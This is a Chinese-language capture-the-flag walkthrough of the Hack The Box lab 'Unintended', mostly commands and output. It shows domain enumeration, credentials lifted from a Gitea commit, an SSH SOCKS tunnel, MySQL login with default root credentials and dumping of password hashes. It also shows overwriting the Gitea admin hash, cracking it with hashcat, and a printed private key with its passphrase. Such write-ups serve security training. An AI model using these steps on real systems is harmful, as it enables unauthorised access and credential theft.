SMB         10.13.38.57     445    DC               [*] Enumerated shares
SMB         10.13.38.57     445    DC               Share           Permissions     Remark
SMB         10.13.38.57     445    DC               -----           -----------     ------
SMB         10.13.38.57     445    DC               sysvol                          
SMB         10.13.38.57     445    DC               netlogon                        
SMB         10.13.38.57     445    DC               home                            Home Directories
SMB         10.13.38.57     445    DC               IPC$                            IPC Service (Samba 4.15.13-Ubuntu)
```

#### bloodhound(失败)
> (signing:Enforced)   ← LDAP 签名强制
>
> (NTLM:False)         ← LDAP 上 NTLM 认证被禁用
>
> netexec 认证用的是 Kerberos，但 BloodHound 收集代码用 ldap3 库，不支持 LDAP签名，被服务端切断
>

```latex
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Unintended]
└─# netexec ldap 10.13.38.57 -u juan -p 'theJUANman2019' \
    --bloodhound \
    --collection All \
    --dns-server 10.13.38.57
LDAP        10.13.38.57     389    DC               [*] None (name:DC) (domain:unintended.vl) (signing:Enforced) (channel binding:Never) (NTLM:False)
LDAP        10.13.38.57     389    DC               [+] unintended.vl\juan:theJUANman2019 
LDAP        10.13.38.57     389    DC               Resolved collection methods: dcom, session, rdp, group, psremote, objectprops, acl, localadmin, trusts, container
LDAP        10.13.38.57     389    DC               [-] BloodHound collection failed: LDAPSessionTerminatedByServerError - session terminated by server
```

### rusthound
> 专门处理 LDAP 签名
>

```latex
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/Unintended/blood]
└─# rusthound-ce -d unintended.vl -u 'juan@unintended.vl' -p 'theJUANman2019' -i 10.13.38.57 --ldaps -z
---------------------------------------------------
Initializing RustHound-CE at 00:44:11 on 03/23/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-03-22T16:44:11Z INFO  rusthound_ce] Verbosity level: Info
[2026-03-22T16:44:11Z INFO  rusthound_ce] Collection method: All
[2026-03-22T16:44:12Z INFO  rusthound_ce::ldap] Connected to UNINTENDED.VL Active Directory!
[2026-03-22T16:44:12Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-03-22T16:44:13Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-22T16:44:15Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=unintended,DC=vl
[2026-03-22T16:44:15Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-22T16:44:22Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=unintended,DC=vl
[2026-03-22T16:44:22Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-22T16:44:29Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=unintended,DC=vl
[2026-03-22T16:44:29Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-22T16:44:29Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=unintended,DC=vl
[2026-03-22T16:44:29Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-22T16:44:30Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=unintended,DC=vl
[2026-03-22T16:44:30Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
⠂ Parsing LDAP objects: 2%                                                                                                                 [2026-03-22T16:44:30Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10                                                         
[2026-03-22T16:44:30Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-03-22T16:44:30Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-03-22T16:44:30Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-03-22T16:44:30Z INFO  rusthound_ce::json::maker::common] 7 users parsed!
[2026-03-22T16:44:30Z INFO  rusthound_ce::json::maker::common] 50 groups parsed!
[2026-03-22T16:44:30Z INFO  rusthound_ce::json::maker::common] 3 computers parsed!
[2026-03-22T16:44:30Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!
[2026-03-22T16:44:30Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-03-22T16:44:30Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-03-22T16:44:30Z INFO  rusthound_ce::json::maker::common] 84 containers parsed!
[2026-03-22T16:44:30Z INFO  rusthound_ce::json::maker::common] .//20260323004430_unintended-vl_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 00:44:30 on 03/23/26! Happy Graphing!
```

### 枚举用户
```latex
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/Unintended/blood]
└─# GetADUsers.py -all -dc-ip 10.13.38.57 'unintended.vl/juan:theJUANman2019'         
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Querying 10.13.38.57 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2024-02-25 03:33:16.851554  2024-02-25 04:16:24.446668 
krbtgt                                                2024-02-25 03:33:16.861209  <never>             
cartor                                                2024-02-25 03:40:32.420303  2024-02-25 04:13:13.581446 
Guest                                                 <never>              <never>             
abbie                                                 2024-02-25 03:40:32.210157  2026-03-22 16:33:13.915629 
juan                                                  2024-02-25 03:40:31.986679  2026-03-22 22:48:56.976885 
```

### 查询 Kerberoastable 账户
```latex
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/Unintended/blood]
└─# GetUserSPNs.py -dc-ip 10.13.38.57 'unintended.vl/juan:theJUANman2019'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

### bloodhound
![](/image/hackthebox-prolabs/Unintended-2.png)



# 10.13.38.59
## web.unintended.vl
> http://10.10.38.59 -> http://web.unintended.vl
>

![](/image/hackthebox-prolabs/Unintended-3.png)

## 目录扫描
### dirsearch
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Unintended]
└─# dirsearch -u http://10.13.38.59 


  _|. _ _  _  _  _ _|_    v0.4.3.post1                                                                  
 (_||| _) (/_(_|| (_| )                                                                                 
                                                                                                        
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/htb/Unintended/reports/http_10.13.38.59/_26-03-22_16-12-36.txt

Target: http://10.13.38.59/

[16:12:36] Starting:                                                                                    
[16:14:14] 403 -  276B  - /server-status                                    
[16:14:14] 403 -  276B  - /server-status/
```

### fuff
```plain
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://10.13.38.59/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 100 -mc 200,301,302,403 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.13.38.59/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,301,302,403
________________________________________________

                        [Status: 200, Size: 2864, Words: 837, Lines: 86, Duration: 1131ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 1409ms]
```

## 枚举子域
### VHost 爆破
```plain
SIZE=$(curl -s http://10.13.38.59 | wc -c) && ffuf -u http://10.13.38.59 -H "Host: FUZZ.unintended.vl" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302,403 -fs $SIZE
```

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Unintended]
└─# ffuf -u http://10.13.38.59 -H "Host: FUZZ.unintended.vl" \
    -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -mc 200,301,302,403 -fs 2864                      

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.13.38.59
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.unintended.vl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301,302,403
 :: Filter           : Response size: 2864
________________________________________________

chat                    [Status: 200, Size: 3132, Words: 141, Lines: 1, Duration: 1391ms]
code                    [Status: 200, Size: 13651, Words: 1050, Lines: 272, Duration: 1592ms]
```

### DNS 枚举
```plain
dnsenum --dnsserver 10.13.38.57 --enum -p 0 -s 0 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt unintended.vl

Brute forcing with /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:                  
_______________________________________________________________________________________                 
                                                                                                        
web.unintended.vl.                       900      IN    A        10.10.10.12                            
web.unintended.vl.                       900      IN    A        10.10.180.22
web.unintended.vl.                       900      IN    A        10.13.38.59
backup.unintended.vl.                    900      IN    A        10.10.10.13
backup.unintended.vl.                    900      IN    A        10.10.180.23
backup.unintended.vl.                    900      IN    A        10.10.152.135
backup.unintended.vl.                    900      IN    A        10.13.38.58
chat.unintended.vl.                      900      IN    A        10.10.180.22
chat.unintended.vl.                      900      IN    A        10.10.152.134
chat.unintended.vl.                      900      IN    A        10.13.38.59
dc.unintended.vl.                        3600     IN    A        10.13.38.57
code.unintended.vl.                      900      IN    A        10.10.10.12
code.unintended.vl.                      900      IN    A        10.10.180.22
code.unintended.vl.                      900      IN    A        10.10.152.134
code.unintended.vl.                      900      IN    A        10.13.38.59
gc._msdcs.unintended.vl.                 900      IN    A        10.13.38.57
domaindnszones.unintended.vl.            900      IN    A        10.13.38.57
forestdnszones.unintended.vl.            900      IN    A        10.13.38.57
```

### 添加hosts
```plain
echo "10.13.38.59 web.unintended.vl" >> /etc/hosts
echo "10.13.38.59 chat.unintended.vl" >> /etc/hosts
echo "10.13.38.59 code.unintended.vl" >> /etc/hosts
echo "10.13.38.58 backup.unintended.vl" >> /etc/hosts
```

## code.unintended.vl
> Powered by Gitea   当前版本: 1.21.3 
>

![](/image/hackthebox-prolabs/Unintended-4.png)

点击左上角的探索，发现存在juan的仓库

![](/image/hackthebox-prolabs/Unintended-5.png)

### 代码信息
> 尝试ssh -i登录10.13.38.59 失败了
>

```plain
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDUv4bvni1yHDPnVWTD3sHlmt+TM7PamITiZT38+gTos5LaQcyed4MM9AaaFA8VH/Fz8+zFGdPj3+9DvoB5UiwEej9DKTajhVwvY8EIktdl12VjzCol1iHJ48I/Tyc0u7h8G+x0nTjg1QC+4+ar9W+HQ1a9+qqXHRmdYd6ak/LV7bSEKYW0o3VGLWErsc9QgnMfrPvDeYWBJZn8rikLk+Pxxs5yaHYNZ3noDER0VnX7uKHEsSw3QdwpRGFl35JXBaUZ+UCPnBcPx3o5AIasediSBJkyWX3C23 nanee@devops
```

```plain
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLEpNlC+Vp34hAxnBgiNGMJTVLnLJHn+3/TRKsD3chE5f/JXWmTrRK2HPF5jBqc4H2AVn2ocaZelg18rzrGzgEul8ffuJWJq6mWx9641bileOBNt6UTx8JcHBGYGxSjV85l2Z/vhHvzHXcQvGj22jTlYrJW2fms9yYn9GXPPsPo+o/rnTNFPqfcTCUNqmxeaVEok8SIQKXrzHfp/arH5VCeguHPZUTYZwrgP/JHEHR6ox7jd3efwWzaLvxkRGD+eGrjOQdTQT5Ej8QdJdNFcboeROs5AjOEGh ratul@devops
```

### 提交记录
![](/image/hackthebox-prolabs/Unintended-6.png)

```plain
ENV APP_SECRET 6SU28SH286DY8HS7D
ENV SFTP_USER ftp_user
ENV SFTP_PASS Th3_F1P_Account$$
```

成功拿到凭据ftp_user/Th3_F1P_Account$$

## ssh登录(失败)
> `/etc/ssh/sshd_config` 文件被设置为限制用户只能进行文件传输，从而阻止交互式 shell 访问
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Unintended]
└─# ssh ftp_user@10.13.38.59
(ftp_user@10.13.38.59) Password: Th3_F1P_Account$$
This service allows sftp connections only.
Connection to 10.13.38.59 closed.
```

## sftp登录
> + 不能拿 shell
> + 目录内容为空(无敏感信息)
> + 但由于 SSH 端口转发未禁用，可利用为 SOCKS 隧道
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Unintended]
└─# sftp ftp_user@10.13.38.59

(ftp_user@10.13.38.59) Password: Th3_F1P_Account$$
Connected to 10.13.38.59.
sftp>get -r ftp_user
```

| 命令 | 说明 | 示例 |
| --- | --- | --- |
| ls | 列出远程目录内容 | ls |
| cd | 切换远程目录 | cd /var/www |
| pwd | 显示远程当前路径 | pwd |
| mkdir | 创建远程目录 | mkdir test |
| rmdir | 删除远程目录 | rmdir test |
| rm | 删除远程文件 | rm test.txt |
| rename | 重命名远程文件 | rename a.txt b.txt |
| get | 下载文件 | get test.txt |
| get -r | 下载目录 | get -r /var/www |
| put | 上传文件 | put shell.php |
| put -r | 上传目录 | put -r tools/ |


## ssh隧道搭建
> SSH 默认不允许通过命令行参数或管道传递密码（出于安全设计），每次都强制要求交互式输入
>
> sshpass 就是专门绕过这个限制的工具，让你能非交互式地传递 SSH 密码
>

```plain
sshpass -p 'Th3_F1P_Account$$' ssh -D 1080 -N ftp_user@10.13.38.59
```

## proxychains注释
> proxychains 默认配置里有这一行：
>
> localnet 127.0.0.0/255.0.0.0
>
> 这行的意思是：127.x.x.x 的流量直接走本地，不经过代理，因此需要手动注释
>

```plain
sudo sed -i 's/^localnet 127.0.0.0/#localnet 127.0.0.0/' /etc/proxychains4.conf
sudo sed -i 's/^localnet 127.0.0.0/#localnet 127.0.0.0/' /etc/proxychains.conf
```

## 端口扫描
> proxychains 的工作原理是通过 LD_PRELOAD 劫持 connect() 系统调用
>
> 用 nmap -sT — TCP connect 扫描，走 connect()，proxychains 可以劫持
>
> 用 nmap -Pn — 跳过 ping（ICMP 也无法通过 SOCKS 代理）
>

```plain
proxychains -q nmap -Pn -sT -sV --min-rate 1000 -p- 127.0.0.1 -oA web_localhost
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
222/tcp   open  rsh-spx
3000/tcp  open  ppp
3306/tcp  open  mysql
8000/tcp  open  http-alt
8065/tcp  open  unknown
8200/tcp  open  trivnet1
42603/tcp open  unknown
58050/tcp open  unknown
```

## MySQL
### 默认凭据
> + 用户名：`root`  密码：`root`
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Unintended]
└─# proxychains -q mysql -h 127.0.0.1 -u root -proot
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 917
Server version: 8.3.0 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

### 信息收集
#### 当前权限
```plain
MySQL [(none)]> select user(), @@hostname, @@datadir, @@version;
+-----------------+--------------+-----------------+-----------+
| user()          | @@hostname   | @@datadir       | @@version |
+-----------------+--------------+-----------------+-----------+
| root@172.21.0.1 | 34b75a1b040f | /var/lib/mysql/ | 8.3.0     |
+-----------------+--------------+-----------------+-----------+
1 row in set (0.590 sec)
```

#### 所有数据库
```plain
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| gitea              |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.540 sec)
```

#### 所有用户及密码哈希
```plain
MySQL [(none)]> select user, host, authentication_string from mysql.user;
+------------------+-----------+------------------------------------------------------------------------+
| user             | host      | authentication_string                                                  |
+------------------+-----------+------------------------------------------------------------------------+
| gitea_user       | %         | $A$005$<U~/je^#g(j?>I6!Ijc9UnV7Fy24zXDCfaUQRt.H9SiV58MxYiMZDR6ugs9 |
| root             | %         | $A$005$rt      eo:MK<o@\u7CP5mAV4oMOXQw8ysPnq.uLbwxtZ7QXqs20wtMnwcbDS0 |
| mysql.infoschema | localhost | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED |
| mysql.session    | localhost | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED |
| mysql.sys        | localhost | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED |
| root             | localhost | $A$005$!w%▒([1CYKe[@E=F6EaIQUoCQNLt3psl3.tuNPC9Y0Udf.NY/smH6l4Rlfx2 |
+------------------+-----------+---------------

MySQL [gitea]> select name, email, passwd, passwd_hash_algo, is_admin, salt from user;
+---------------+-----------------------------+------------------------------------------------------------------------------------------------------+------------------+----------+----------------------------------+
| name          | email                       | passwd                                                                                               | passwd_hash_algo | is_admin | salt                             |
+---------------+-----------------------------+------------------------------------------------------------------------------------------------------+------------------+----------+----------------------------------+
| administrator | administrator@unintended.vl | f57a3d5d199ac8054c709e665b4eb4842f0e172a253a96038be5ef9e6fe7b0290f2d715524883dd117ac309e878c1dbbe902 | pbkdf2$50000$50  |        1 | 6f7cf4aa34feb922092ef9f7ca342fa5 |
| juan          | juan@unintended.vl          | d8bf3dff89969075cd73cc1496942901ea132619454318cb37e4bec821d6867045bcbc0ac2905c2531ee5d6e6c5a475c9b51 | pbkdf2$50000$50  |        0 | a3914c8815b674a9f680eaf8eb799e19 |
+---------------+-----------------------------+------------------------------------------------------------------------------------------------------+------------------+----------+----------------------------------+
```

### 方法一：Administrator密码写入
#### hash生成
```latex
┌──(kali㉿kali)-[~/Desktop/htb/Unintended]
└─$ python3 -c "import hashlib, binascii; password = 'Pass@123'; salt = '6f7cf4aa34feb922092ef9f7ca342fa5'; dk = hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt.encode('utf-8'), 50000, dklen=50); print(binascii.hexlify(dk).decode())"
e2c73d5428838783c6bc836f34d52eb631b199d91d26b76c89e51ea2de33910b5e326c95281f548f4daa49011ab676a44f9c
```

#### 写回数据库
```latex
update user set passwd='<上面生成的hash>' where name='administrator';
```

### 方法二：Administrator 密码破解
#### salt转base64
```bash
echo '6f7cf4aa34feb922092ef9f7ca342fa5' | xxd -r -p | base64
```

结果：

```latex
b3z0qjT+uSIJLvn3yjQvpQ==
```

#### 哈希密码转base64
将哈希转 base64：

```bash
echo 'f57a3d5d199ac8054c709e665b4eb4842f0e172a253a96038be5ef9e6fe7b0290f2d715524883dd117ac309e878c1dbbe902' | xxd -r -p | base64
```

结果：

```latex
9Xo9XRmayAVMcJ5mW060hC8OFyolOpYDi+Xvnm/nsCkPLXFVJIg90ResMJ6HjB276QI=
```

#### administrator.gitea.hash
构造 hashcat 输入：

```bash
sha256:50000:b3z0qjT+uSIJLvn3yjQvpQ==:9Xo9XRmayAVMcJ5mW060hC8OFyolOpYDi+Xvnm/nsCkPLXFVJIg90ResMJ6HjB276QI=
```

#### hashcat
破解命令：

```bash
hashcat -a0 -m10900 administrator.gitea.hash /usr/share/wordlists/rockyou.txt
```

得到凭据：`administrator@unintended.vl : loveandhate`

## Gitea
> `administrator@unintended.vl : loveandhate`凭据进行登录
>

### Explore
> 发现Private仓库
>

![](/image/hackthebox-prolabs/Unintended-7.png)

### 敏感信息
> 发现敏感凭据juan/theJUANman2019
>

```latex
ssh-keygen -t rsa -b 4096 -C "juan@unintended.local" -N "theJUANman2019" -f ~/.ssh/id_rsa
```

```latex
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCiqcfXRIOpjZdZNPvhd8xTJpevvwxaiKiD9RnLogLJTMwKdIttXkNSHdXsWIEyY/Irwr4/J721uykNRJ29OjPVwsfl6UeXO+/iQ8Lb+rFuX6xMLUKOqO9B4xpRQUdW0YOMekvxTQLCDqDk/D1E96UO95Mp/tfAvCSjSqCQf7xVr65z5ro/9GW41djZenIrEEVxQD3+i9yH9xBRZlBiYB35+X68mefnp8lWGmGas+E8X6tTMelzZGxibg6hLGaPVFVSLMIjxue4Yv8iWLQmvPWpBJsFOrEqgTjci8xCyZSsPhQXVujFvp4xjgfTxfqDsnmVv6m3ytFswNBPBEZ7GCaLNo3lQyi5nbKEkRiqu2FuIa6rUasaK+rDeKefTtUKQZKPlA9bh14KMGVY1et1Iv5F46PvXfhgyINl2sbXr72PD/MXt93pcRZtw8NDsjFNgyIiQU8uMpkF4NBxfsyAY7kCNCtR+kRUj+pxaGiuxcQ+9A1b+cl5vov19bcqvK2bmC4PKX+dwHwTvTMVXfz/LlcMeFAWhoWwVceKhyetQIUWQhkw1zD+yf3a6baregiPOPlnkj1VEcdIMSx0PEK7Cvh7or40uni+xFLWh1ieJF4jGw/6yfvd1pI4NDG+dGd0plzVwOYawmk1FivtadynUcCkuFgAhGSsMOhvf36ueqcf7w== juan@unintended.local
```

```latex
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCiqcfXRIOpjZdZNPvhd8xTJpevvwxaiKiD9RnLogLJTMwKdIttXkNSHdXsWIEyY/Irwr4/J721uykNRJ29OjPVwsfl6UeXO+/iQ8Lb+rFuX6xMLUKOqO9B4xpRQUdW0YOMekvxTQLCDqDk/D1E96UO95Mp/tfAvCSjSqCQf7xVr65z5ro/9GW41djZenIrEEVxQD3+i9yH9xBRZlBiYB35+X68mefnp8lWGmGas+E8X6tTMelzZGxibg6hLGaPVFVSLMIjxue4Yv8iWLQmvPWpBJsFOrEqgTjci8xCyZSsPhQXVujFvp4xjgfTxfqDsnmVv6m3ytFswNBPBEZ7GCaLNo3lQyi5nbKEkRiqu2FuIa6rUasaK+rDeKefTtUKQZKPlA9bh14KMGVY1et1Iv5F46PvXfhgyINl2sbXr72PD/MXt93pcRZtw8NDsjFNgyIiQU8uMpkF4NBxfsyAY7kCNCtR+kRUj+pxaGiuxcQ+9A1b+cl5vov19bcqvK2bmC4PKX+dwHwTvTMVXfz/LlcMeFAWhoWwVceKhyetQIUWQhkw1zD+yf3a6baregiPOPlnkj1VEcdIMSx0PEK7Cvh7or40uni+xFLWh1ieJF4jGw/6yfvd1pI4NDG+dGd0plzVwOYawmk1FivtadynUcCkuFgAhGSsMOhvf36ueqcf7w== juan@unintended.local
```

```latex
juan@UNINTENDED.LOCAL
```

```latex
-----BEGIN OPENSSH PRIVATE KEY-----
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
C7gKiNNec8b3lJ1S41ie/FqF0=
-----END OPENSSH PRIVATE KEY-----
```

## juan@unintended.vl
### ssh登录
```latex
sshpass -p theJUANman2019 ssh -i id_rsa juan@unintended.vl@10.13.38.59
```

### Getflag
```latex
juan@unintended.vl@web:~$ cat flag.txt
UNINTENDED{3ddc6a1f44659b219e7446ddbd2878ae}
```

### chat.unintended.vl
> http://chat.unintended.vl/login
>
> 凭据复用juan@unintended.vl/theJUANman2019
>

#### theabbs
> 在与theabbs的对话中提到theabbs的密码格式名字+出生年份
>
> 同时我们还发现juank发过一份github
>
